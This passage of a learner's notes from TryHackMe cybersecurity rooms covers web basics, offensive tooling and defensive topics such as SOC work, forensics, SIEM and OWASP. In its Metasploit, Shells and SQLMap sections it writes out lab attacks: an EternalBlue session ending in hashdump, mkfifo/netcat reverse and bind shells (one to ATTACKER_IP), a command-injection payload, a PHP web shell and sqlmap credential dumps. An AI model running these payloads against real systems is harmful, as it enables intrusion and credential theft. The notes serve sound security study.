- **Gain access:** many of these commands have been used several times; noted here but focusing on new commands and learnings
  ```bash
  search eternal
  use 0
  show options
  set RHOSTS 10.145.128.228
  set payload windows/x64/shell/reverse_tcp
  # ^Z to background
  use post/multi/manage/shell_to_meterpreter
  show options
  set session 1
  run
  sessions
  sessions -i 2
  ps
  migrate 1276
  getuid
  hashdump
  cd ..
  cd ..
  ```
  - Navigated the Documents and Desktop folders to obtain flags with `cd`, `ls`, and `cat`

---

## Module 8: Web Hacking

### Web Application Basics

- **Web application overview:** breakdown of HTML, CSS, JavaScript, database, infrastructure, and WAF
- **Uniform Resource Locator (URL):** overview/review of URLs and their parts: scheme, user, host/domain, port, path, query string, fragment
- **HTTP messages:** overview of HTTP message packets: requests/responses, start line, headers, empty line, and body
- **HTTP requests: request line and methods:** request line, HTTP methods (`GET`, `POST`, `PUT`, `DELETE`, `PATCH`, `HEAD`, `OPTIONS`, `TRACE`, `CONNECT`), URL path, HTTP versions
- **HTTP request: headers and body**
  - Common request headers - Host, User-Agent, Referer, Cookie, Content-Type
  - Request body forms - URL-encoded, form data, JSON, XML
- **HTTP response: status line and status codes**
  - The status line
  - Status code ranges - Informational 100–199, Successful 200–299, Redirection 300–399, Client Error 400–499, Server Error 500–599
  - Common codes - 100 Continue, 200 OK, 301 Moved Permanently, 404 Not Found, 500 Internal Server Error
- **HTTP response: headers and body**
  - Required response headers - Date, Content-Type, Server
  - Common response headers - Set-Cookie, Cache-Control, Location; response body
- **Security headers**
  - Content-Security-Policy - `default-src`, `script-src`, `style-src`
  - Strict-Transport-Security (HSTS) - `max-age`, `includeSubDomains`, `preload`
  - X-Content-Type-Options - `nosniff`
  - Referrer-Policy - `no-referrer`, `same-origin`, `strict-origin`, `strict-origin-when-cross-origin`
- **Practical task: making HTTP requests**
  - `GET` request to `https://tryhackme.com/api/users` to find the user list and obtain the flag
  - `POST` request to `https://tryhackme.com/api/user/2` setting the key `country` to value `US`
  - `DELETE` request to `https://tryhackme.com/api/user/1` to delete user 1

### JavaScript Essentials

- **Essential concepts:** basic syntax: `var`, `let`, `const`, string, number, boolean, `printResult`, loops (`for`, `while`, `do...while`), true/false
- **JavaScript overview:** wrote a simple program in the VM's Chrome browser:
  ```javascript
  let x = 10;
  let y = 10;
  let result = x + y;
  console.log("The result is: " + result); // The result is: 20
  ```
- **Integrating JavaScript in HTML**
  - Analyzed JS and HTML together, and the difference between internal and external scripts
  - Example of how external JS files are linked with the `src` attribute:
  ```html
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>External JS</title>
  </head>
  <body>
      <h1>Addition of Two Numbers</h1>
      <p id="result"></p>
      <!-- Link to the external JS file -->
      <script src="script.js"></script>
  </body>
  </html>
  ```
- **Abusing dialogue functions**
  - Wrote an `alert` in the Chrome console to trigger a pop-up: `alert("Hello THM")`
  - Practiced `prompt`:
    ```javascript
    name = prompt("What is your name?");
    alert("Hello " + name);
    ```
  - Practiced `confirm`: `confirm("Do you want to proceed?")`
  - Executed sample code to create an alert that says "Hacked" when opened
- **Bypassing control flow statements**
  - Analyzed sample code to better understand if-else statements and prompts
  - Given an admin login file; analyzed the HTML to retrieve the plaintext password and logged into the admin account
- **Exploring minified files**
  - Shown examples of obfuscated/minified code and website tools to obfuscate and deobfuscate it
  - Practiced with both tools on the provided HTML
- **Best practices**
  - These tools add another layer attackers have to get through to read your code
  - Avoid hardcoded secrets
  - Refrain from adding untrusted libraries

### SQL Fundamentals

- **Databases 101**
  - Relational vs. non-relational databases
  - Review of tables, rows, columns
  - Introduction to primary key and foreign key
- **SQL**
  - Introduction to SQL and common DBMSs - MySQL, MongoDB, Oracle Database, and MariaDB
- **Database and table statements:** ran the following in MySQL to follow along and obtain flags:
  ```sql
  CREATE DATABASE thm_bookmarket_db;
  SHOW DATABASES;
  USE thm_bookmarket_db;
  DROP DATABASE thm_bookmarket1_db;
  SHOW TABLES;
  DESCRIBE book_inventory;
  ALTER TABLE book_inventory ADD page_count INT;
  USE task_4_db;
  SHOW TABLES;
  ```
- **CRUD operations**
  - `USE thm_books;`
  - Briefed on `INSERT INTO`, `SELECT`, `UPDATE`, `DELETE`
  - Answered questions with: `USE tools_db;`, `SHOW TABLES;`, `SELECT * FROM hacking_tools;`
- **Clauses**
  - `DISTINCT`, `GROUP BY`, `COUNT`, `ORDER BY`, `ASC`, `DESC`, `HAVING`
  ```sql
  USE tools_db;
  SELECT * FROM hacking_tools ORDER BY name ASC;
  SELECT * FROM hacking_tools ORDER BY name DESC;
  ```
- **Operators**
  - `LIKE`, `AND`, `OR`, `NOT`, `BETWEEN`, comparison operators (equal / not equal, less than / greater than)
  ```sql
  SELECT * FROM hacking_tools WHERE description LIKE "%pentesters and geeks%";
  SELECT * FROM hacking_tools WHERE amount >= "300";
  SELECT * FROM hacking_tools WHERE amount < "100" AND category = "Network intelligence";
  ```
- **Functions**
  - String functions: `CONCAT()`, `GROUP_CONCAT()`, `SUBSTRING()`, `LENGTH()`, `COUNT()`, `SUM()`, `MAX()`, `MIN()`
  ```sql
  SELECT name, LENGTH(name) AS name_length FROM hacking_tools ORDER BY name_length DESC;
  SELECT SUM(amount) AS total_amount FROM hacking_tools;
  SELECT GROUP_CONCAT(name SEPARATOR ' & ') AS tool_names FROM hacking_tools WHERE amount NOT LIKE '%0';
  ```

### Burp Suite: The Basics

- **What is Burp Suite:** a simple introduction to Burp Suite Community, Professional, and Enterprise
- **Features of Burp Community:** key features: Proxy, Repeater, Intruder, Decoder, Comparer, Sequencer
- **The Dashboard**
  - Started Burp Suite Community on the TryHackMe VM to get a feel for the dashboard and tools
  - Breakdown of the dashboard sections - Tasks, Event Log, Issue Activity, and Advisory
- **Navigation:** module selection and sub-tabs
- **Options:** navigated the settings and dashboard to get familiar
- **Introduction to the Burp Proxy**
  - Intercepting requests, taking control, capture and logging, WebSocket support
  - Logs and history, response interception, match and replace
- **Connecting through the proxy**
  - Set up a proxy with the FoxyProxy Firefox extension and intercepted a website request in Burp Suite
- **Site map and issue definitions**
  - Site map, issue definitions, and scope settings
  - Visited a site in the Burp browser to analyze traffic captured through Burp's proxy; after spotting an unusual endpoint, obtained the room flag hidden in the response section
- **Scoping and targeting:** set and configured scope limitations
- **Example attack:** shown an example of bypassing a client-side filter by capturing traffic and inserting an XSS payload

---

## Module 9: Offensive Security Tooling

### Hydra

This room was primarily a demonstration of how to use Hydra.

- Introduction to basic Hydra commands
- Introduction to POST web forms and how to brute-force passwords
- **Learning lesson:** The most informative part of this room was being able to compare similar tools, for example Hydra vs. John the Ripper. It's valuable to see two tools that gain access to an account but by different means: John the Ripper is an offline, locally hosted program, while Hydra is used to brute-force an account over a network. John can be seen as much quieter but needs some extra information, whereas Hydra is noisier but can gain access with very little prior knowledge if an account has no rate limiter.

### Gobuster: The Basics

- Introduction to Gobuster and the commands we'll focus on - `dir`, `dns`, `vhost` - plus the flags `--threads`, `--wordlist`, `--delay`, `--debug`, `--output`
  - Answered questions on the syntax of the topics covered
- **Use case: directory and file enumeration**
  - Briefed on flags: `--cookies`, `--extensions`, `--headers`, `--no-tls-validation`, `--no-status`, `--status-codes`, `--status-codes-blacklist`, `--username`, `--password`, `--follow-redirect`
  - Used `dir` to enumerate files and obtain a flag in a "secret" file:
    ```bash
    gobuster dir -u http://10.144.158.145 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -H "Host: www.offensivetools.thm"
    gobuster dir -u http://10.144.158.145/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x js -H "Host: www.offensivetools.thm"
    gobuster dir -u http://10.144.158.145/secret/flag.js -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x js -H "Host: www.offensivetools.thm"
    curl http://10.144.158.145/secret/flag.js -H "Host: www.offensivetools.thm"
    ```
  - Flag: `THM{ReconWasASuccess}`
- **Use case: subdomain enumeration**
  - Introduction to subdomain enumeration and the flags `--show-cname`, `--show-ips`, `--resolver`, `--domain`
    ```bash
    gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --resolver 10.144.158.145
    gobuster dns -d offensivetools.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --resolver 10.144.158.145
    ```
- **Use case: vhost enumeration**
  - Introduction to vhost enumeration and how it compares with DNS
  - Briefed on: `--url`, `--append-domain`, `--method`, `--domain`, `--exclude-length`, `--follow-redirect`
  - Found the vhosts on `offensivetools.thm` with a status code of 200:
    ```bash
    gobuster vhost -u "http://10.144.158.145" --domain offensivetools.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320
    ```

### Shells Overview

- **Shell overview**
  - Definition of a shell
  - Common activities attackers perform on a compromised shell: remote system control, privilege escalation, data exfiltration, persistence and maintaining access, post-exploitation activities, and pivoting to other systems on the network
- **Reverse shell**
  - How reverse shells work
    - Setting up a Netcat (`nc`) listener
    - A pipe reverse shell payload:
      ```bash
      rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT > /tmp/f
      ```
- **Bind shell**
  - How bind shells work; setting one up on the target
    ```bash
    # Target (lab machine)
    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
    # Attacker (connect)
    nc -nv 10.146.189.206 8080
    ```
- **Shell listeners:** introduction to `rlwrap`, `ncat`, and `socat`
- **Shell payloads:** payloads that can be used on Linux: Bash, PHP, Python
- **Web shell:** examples of PHP and other web shells
- **Practical task**
  - Identified a command injection vulnerability in a PHP web app that passed unsanitized user input directly to a system command (`md5sum <input>`)
  - Set up a Netcat listener on the AttackBox: `nc -lvnp 443`
  - Exploited the injection point with a semicolon-chained mkfifo reverse shell payload:
    ```bash
    hello.txt; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.144.118.156 443 > /tmp/f
    ```
  - Navigated the target filesystem and retrieved the flag: `cat /flag.txt` → `THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}`
  - Identified an unrestricted file upload vulnerability on a separate web app with no MIME type or extension validation
  - Created a PHP web shell locally and uploaded it through the app's upload functionality:
    ```bash
    echo '<?php system($_GET["cmd"]); ?>' > /root/shell.php
    ```
  - Accessed the uploaded shell via browser and executed arbitrary commands via URL parameter:
    ```
    http://10.144.133.83:8082/uploads/shell.php?cmd=cat+/flag.txt
    ```
    → `THM{202bb14ed12120b31300cfbbbdd35998786b44e5}`

### SQLMap: The Basics

- Introduction/recap of SQL
- Examples of SQL queries and what each part does:
  ```sql
  SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
  SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
  ```
- **Automated SQL injection tool:** reviewed the following on a provided terminal:
  - Interactive wizard
  - Testing a URL for SQL injection
  - Extracting database names
  - Extracting tables
  - Extracting records from a table
  - Testing an intercepted request
  - Provided a command to extract all tables from the "members" database:
    ```bash
    sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables
    ```
- **Practical exercise**
  1. Captured the login request via DevTools Network tab (dummy creds `test/test`) to get the vulnerable GET request URL
  2. Confirmed the injection point:
     ```bash
     sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' --batch --level=5
     ```
     Result: `email` parameter vulnerable, time-based blind, MySQL backend
  3. Enumerated databases:
     ```bash
     sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' --cookie="PHPSESSID=..." --batch --level=5 --dbs
     ```
     Result: 6 databases found; target database: `ai`
  4. Enumerated tables in the `ai` database:
     ```bash
     sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' --cookie="PHPSESSID=..." --batch --level=5 -D ai --tables
     ```
     Result: table name is `user`
  5. Dumped credentials from the `user` table:
     ```bash
     sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' --cookie="PHPSESSID=..." --batch --level=5 -D ai -T user --dump
     ```
     Result: password for `test@chatai.com` = `12345678`

---

## Module 10: Defensive Security

### SOC Fundamentals

- **Introduction to the SOC:** a quick explanation of a SOC
- **Purpose and components**
  - Detection - detect vulnerabilities, unauthorized activity, policy violations, and intrusions
  - Response - support incident response
  - The three pillars of a SOC: people, process, and technology
- **People:** SOC team structure: CISO, SOC manager, detection engineer, security engineer, SOC analyst levels 1–3
- **Process:** alert triage and answering the 5 Ws: who, what, when, where, and why
- **Technology:** technology used by SOC teams: SIEM, EDR, firewall
- **Practical exercise:** acted as a Tier 1 SOC analyst investigating a port-scanning alert observed on a host (`10.0.0.8`)
  - Acknowledged the alert and verified: type of activity, time of activity, destination host IP, source hostname, reason for the activity (intended), and whether any response was sent back to the port-scanner IP
  - Closed out the alert

### Digital Forensics Fundamentals

- **Introduction to digital forensics:** an example of someone being arrested and how their evidence can give law enforcement details about the suspected crime
- **Digital forensics methodology**
  - The NIST digital forensics framework: Collection, Examination, Analysis, Reporting
  - Types of digital forensics: computer, mobile, network, database, cloud, and email forensics
- **Evidence acquisition:** methods used to ensure data integrity
  - Proper authorization
  - Chain of custody (reviewed a sample chain-of-custody document)
  - Use of write blockers
- **Windows forensics**
  - Windows OS images and how they're taken - disk image and memory image
  - Popular tools for disk and memory image acquisition and analysis - FTK Imager, Autopsy, DumpIt, Volatility
- **Practical example:** provided three files and two programs (`pdfinfo`, `exiftool`) to analyze metadata and learn about the person's possible whereabouts and equipment
  - `cd /root/Rooms/introdigitalforensics`
  - `ls`
  - `pdfinfo ransom-letter.pdf` - author: `Ann Gree Shepherd`
  - `exiftool letter-image.jpg` - obtained the coordinates where the attached picture was taken; entered them into Google Maps to find the street name: `Milk Street`
  - `exiftool letter-image.jpg | grep Camera` - camera model: `Canon EOS R6`

### Incident Response Fundamentals

- **Introduction to incident response**
- **What are incidents:** the incident structure, including false and true positives, and ranking alerts by severity to maintain proper workflow
- **Types of incidents:** malware infections, security breaches, data leaks, insider attacks, denial-of-service attacks
- **Incident response process:** the NIST and SANS frameworks, with a detailed breakdown of SANS
  - SANS (PICERL): Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned
  - NIST: Preparation; Detection and Analysis; Containment, Eradication, and Recovery; Post-Incident Activity
- **Incident response techniques:** SIEM, AV, EDR, playbooks and runbooks
- **Lab work:** incident response
  - Initiated an incident by downloading a malicious PDF named `payslip.pdf`
  - Quarantined and analyzed affected systems
  - Determined key details: who the malicious sender was, the threat vector, how many devices downloaded the email attachment, and how many executed the file

### Logs Fundamentals

- **Introduction to logs**
- **Types of logs:** system, security, application, audit, network, and access logs
- **Windows event log analysis**
  - Crucial Windows log types - Application, System, Security
  - Demonstration of Windows Event Viewer and navigating different logs and settings
  - Common event IDs - successful logon, failed logon, logged off, account created, password reset attempt, account enabled/disabled, account deleted
  - Exercise - navigated Event Viewer for information about a recent event
    - Located the user account name by filtering by event ID 4720
    - Located who created the account and when
    - Used event ID 4724 to confirm the account had undergone a password reset
- **Web server access log analysis**
  - Example log files and a breakdown of fields - IP address, timestamp, request (HTTP method, URL), status code, user agent
  - Ran the following to obtain requested information:
    - `cd /root/Rooms/logs`
    - `cat access.log` to confirm the correct file
    - `grep "/contact" access.log` - the IP that made the last GET request to the specified URL
    - `grep "172.16.0.1" access.log` - when the last POST request was made by the specified IP
    - Confirmed the URL was `/contact` for that POST request

---

## Module 11: Security Solutions

### Introduction to SIEM

- **Overview of logs:** host-centric vs. network-centric log sources
- **Why SIEM?:** features:
  - Centralized log collection
  - Normalization of logs (parsing/normalization)
  - Correlation of logs
  - Real-time alerting
  - Dashboards and reporting
- **Log sources and ingestion**
  - Review of Windows events in Event Viewer
  - Linux log locations:
    - `/var/log/httpd` - HTTP request/response and error logs
    - `/var/log/cron` - cron jobs
    - `/var/log/auth.log` and `/var/log/secure` - authentication logs
    - `/var/log/kern` - kernel-related events
  - Log ingestion methods:
    - Agent/forwarder - agent installed on the endpoint captures and sends important logs to the SIEM server
    - Syslog - collects data from various systems (web servers, databases) and sends real-time data to a centralized destination
    - Manual upload - ingest data offline
    - Port-forwarding - configured to listen on a certain port
  - Reviewed a couple of Splunk screenshots for reference
- **Alerting process and analysis:** detection rules with examples, and alert investigation
- **Lab work**
  - Investigated a mock scenario where an HR temp downloaded a cryptominer file
  - Identified the process that caused the alert
  - Found the user and hostname of the responsible parties
  - Examined the rule and the suspicious process to determine which term matched the rule
  - Determined whether the event was a true or false positive

### Firewall Solutions

- **Introduction/overview** of the job of a firewall
- **Types of firewalls**
  - Stateless - fast, not used for complex rules; operates at Layers 3 and 4 of the OSI model
  - Stateful - similar to stateless but considers previous connections, storing them in a state table
  - Proxy - operates at Layer 7 and adds content filtering; provides anonymity for internal IPs by masking them with its own IP
  - Next-Generation (NGFW) - operates across Layers 3–7, provides advanced threat protection, includes an intrusion prevention system, and decrypts/inspects SSL/TLS packets
- **Rules in firewalls:** basic components of a rule: source address, destination address, port, protocol, action, direction
  - Review of Allow, Deny, Forward
- **Windows Defender Firewall**
  - Configured a rule to deny outbound web traffic on ports 80 and 443
  - Analyzed rules and answered questions based on their configurations (e.g., the name of the rule created to block all incoming traffic on the SSH port; which IP address is allowed under a given rule)
- **Linux iptables firewall**
  - Introduction to Netfilter - `iptables`, `nftables`, `firewalld`
  - Examples of simple `ufw` rules - allow/deny all traffic, enable traffic, deny `22/tcp`
  - Created and executed a `ufw` rule: `sudo ufw default deny outgoing`

### IDS Fundamentals

- **Types of IDS:** Host IDS, Network IDS, Signature-based IDS, Anomaly-based IDS, Hybrid IDS
- **IDS example: Snort:** its modes and use cases
  - Packet Sniffer mode
  - Packet Logger mode
  - NIDS mode
- **Snort usage:** Snort rule format: action, protocol, source IP, source port, destination IP, destination port, rule metadata, message, signature ID (SID), rule revision
  - Submitted a created rule that detects a ping on the network and displays the message "Loopback ping detected"
  - Tested the rule by starting Snort with `sudo` and running a `ping` to `127.0.0.1`
  - Ran an example Snort command on a PCAP file
- **Practical lab:** the lab was already completed above; answered questions on the executed commands
  - IP address that tried to connect via SSH: `10.11.90.211`
  - Other rule message detected in the PCAP besides SSH: `Ping Detected`
  - SID of the rule that detects SSH: `1000002`

### Vulnerability Scanner Overview

- **What are vulnerabilities:** review of vulnerabilities and patching
- **Vulnerability scanning**
  - Can be a compliance requirement from regulatory bodies; some standards advise scanning quarterly, some annually
  - Authenticated vs. unauthenticated scans
  - Internal vs. external scans
- **Tools for vulnerability scanning:** Nessus, Qualys, Nexpose, OpenVAS
- **CVE & CVSS:** review
- **OpenVAS:** a walkthrough of installing OpenVAS, setting up a new task to scan the target network, reading the scan report, finding details on the vulnerabilities, and generating a report
- **Practical exercise:** reviewed an example OpenVAS report showing 4 vulnerabilities, one with a critical CVSS score of 10.0
  - **Learning lesson:** This was extremely beneficial for understanding how an enterprise vulnerability scan is conducted. Seeing how the report is generated (with a summary, impact, solution, and more) gave me a clearer picture of what to expect going into the enterprise cybersecurity world.

---

## Module 12: Defensive Security Tooling

### CyberChef: The Basics

- **Introduction to CyberChef**
- **Navigating the interface:** the Operations, Recipe, Input, and Output areas
- **Before anything else:** a thought process for CyberChef:
  - Clear objective
  - Input data
  - Select the operations you want to use
  - Check the output to see if it's the intended result
- **Practice:** a breakdown of several operations, including extracting IP addresses and URLs, From Base64, URL Decode, and From UNIX Timestamp. Operations used:
  - Extract email addresses
  - Extract IP addresses
  - Extract domains
  - From Decimal
  - To Binary
  - URL Encode
- **Your first official cook:** operations used:
  - To Base64
  - URL Decode
  - From UNIX Timestamp
  - From Base85

### CAPA: The Basics

- **Introduction to CAPA:** a short introduction and example of how CAPA works
- **Dissecting CAPA results, Part 1: general information, MITRE, and MAEC**
  - First block of text - cryptographic algorithms, analysis, OS, arch, path
  - MITRE ATT&CK framework
  - MAEC framework - launcher, downloader
- **Dissecting CAPA results, Part 2: Malware Behavior Catalogue**
  - MBC (Malware Behavior Catalogue), objective, micro-objective, MBC behaviors, micro-behavior, methods
- **Dissecting CAPA results, Part 3: namespaces**
  - Introduction to capability and namespace
  - Top-level namespaces including anti-analysis, collection, and communication - 17 namespaces covered in total
- **Dissecting CAPA results, Part 4: capability**
  - A table of capabilities and their related top-level namespace, namespace, and associated YAML rules - 20+ capabilities covered
- **Introduction to the CAPA Web Explorer** and the tools/filters available

### REMnux: Getting Started

- **Introduction to REMnux**
- **File analysis:** analyzed files and answered questions:
  ```bash
  oledump.py agenttesla.xlsm
  oledump.py agenttesla.xlsm -s 4
  oledump.py agenttesla.xlsm -s 4 --vbadecompress
  ```
  - Repeated the commands to analyze another file
- **Fake network to aid analysis**
  - Configured INetSim inside the REMnux VM
  - Edited the config: `sudo nano /etc/inetsim/inetsim.conf`
  - Changed the value of `dns_default_ip`
  - Ran `inetsim`
  - Downloaded the payload: `sudo wget https://MACHINE_IP/second_payload.ps1 --no-check-certificate` *(notes written later, so the IP was unavailable)*
  - Ended INetSim and viewed the generated report: `sudo cat /var/log/inetsim/report/report.2594`
- **Memory investigation: evidence preprocessing**
  - Introduction to 7 Windows Volatility plugins; some covered:
    - `windows.pstree.PsTree`
    - `windows.pslist.PsList`
    - `windows.cmdline.CmdLine`
  - Focused mainly on these plugins with simple follow-along tasks, executing the first command of each

### FlareVM: Arsenal of Tools

- **Arsenal of tools:** introduction to tools from these categories:
  - Reverse Engineering & Debugging
  - Disassemblers & Decompilers
  - Static & Dynamic Analysis
  - Forensics & Incident Response
  - Network Analysis
  - File Analysis
  - Scripting & Automation
  - Sysinternals Suite
- **Commonly used tools for investigation: overview:** samples and overviews of:
  - Procmon
  - Process Explorer
  - HxD
  - Wireshark
  - CFF Explorer
  - PEStudio
  - FLOSS
  - Used PEStudio and CFF Explorer to analyze files and obtain: the SHA256 value, how many functions the file has, the MD5 hash, and the `e_magic` value
- **Analyzing malicious files**
  - Used Wireshark to find the defanged IP the process was connecting to, as well as the C2 IP
  - Used Process Explorer to find the parent process of the file
  - Used PEStudio to identify the file's imphash
- **Learning lesson:** This room was extremely useful for getting my hands dirty and using multiple tools to identify different characteristics of malicious files, along with key indicators to look out for, such as the Russian language found in the metadata comments and company name. Although this is just the surface of defensive tooling, I now have a better understanding of the investigative techniques that go into ensuring company safety and security.

---

## Module 13: Build Your Cybersecurity Career

### Security Principles

- **Introduction:** the importance of knowing your adversary
- **CIA**
  - Review of the CIA triad (authenticity and non-repudiation also covered)
  - Introduction to the Parkerian Hexad
  - Short quiz on the CIA triad
- **DAD:** Disclosure, Alteration, Destruction
- **Fundamental concepts of security models**
  - Bell-LaPadula Model - Simple Security Property, Star (\*) Security Property, Discretionary-Security Property
  - Biba Integrity Model - Simple Integrity Property, Star Integrity Property
  - Clark-Wilson Model - Constrained Data Item (CDI), Unconstrained Data Item (UDI), Transformation Procedures (TP), Integrity Verification Procedures (IVP)
- **Defense-in-Depth:** quick summary/review
- **ISO/IEC 19249**
  - The five architectural principles - Domain Separation, Layering, Encapsulation, Redundancy, Virtualization
  - The five design principles - Least Privilege, Attack Surface Minimization, Centralized Parameter Validation, Centralized General Security Services, Preparing for Error and Exception Handling
- **Zero Trust versus Trust but Verify:** review of both
- **Threat versus Risk:** comparison of vulnerability, threat, and risk

### Training Impact on Team

This room focused on the importance of training your team to perform at its maximum potential. Examples included a business case supporting an enterprise argument for more training budget, as well as a way to calculate ROI. These were helpful, as I'll likely work in an enterprise environment and will have to work through budget allocation, ROI, team onboarding, and overall training standards.

---

## Module 14: OWASP Top 10 (2025)

### IAAA Failures

- **Review of IAAA**
- **Broken Access Control**
  - Overview of broken access control and common occurrences like IDOR (Insecure Direct Object Reference)
  - Practical lab - exploited an IDOR vulnerability by changing the ID parameter in the URL to access another user's bank account information without proper authorization checks
  - Recommended fixes:
    - Implement proper authentication and authorization checks
    - Verify that the authenticated user has permission to access the requested resource
    - Use indirect references or encrypted tokens instead of predictable IDs
    - Log and monitor access attempts to sensitive resources
- **Authentication Failures:** common issues:
  - Username enumeration
  - Weak/guessable passwords (no lockout/rate limits)
  - Logic flaws in the login/registration flow
  - Insecure session or cookie handling
  - Practical lab - broke into the "admin" account by registering a user named `aDmiN`, exploiting a flawed registration/login flow
- **A09: Logging & Alerting Failures**
  - Covered the importance of logging and alerts
  - Conducted a mock SIEM investigation of a brute-force attack on an admin account, where the attacker then gained access to admin-level files

### Application Design Flaws

- **Security Misconfigurations**
  - Review of what a security misconfiguration is
  - Why it matters, with an example - the 2017 Uber breach that exposed a backup AWS S3 bucket
  - Common patterns (a partial list):
    - Default credentials or weak passwords left unchanged
    - Unnecessary services or endpoints exposed to the internet
    - (Several more listed, along with prevention measures)
  - Broke API validation by sending a non-numeric value instead of a number to obtain the flag:
    ```bash
    curl -s http://10.146.189.30:5002/api/user/abs
    ```
- **Software Supply Chain Failures:** review of supply chain failures
- **Cryptographic Failures:** common patterns:
  - Using deprecated or weak algorithms
  - Hard-coded secrets in code or configuration
  - Poor key rotation or management practices
  - (Prevention efforts covered)
- **Insecure Design:** common patterns:
  - Weak business logic controls
  - Flawed assumptions about user or model behavior
  - AI components with unchecked authority or access

### Insecure Data Handling

Overview of the following:

- **A04: Cryptographic Failures**
- **A05: Injection**
- **A08: Software or Data Integrity Failures**

Similar to the prior room, this one followed the same format (overview, real-life examples/common patterns, then solutions) with short one-step follow-along labs for each topic. These examples can be found in more detail in earlier rooms, as the material is mostly review.
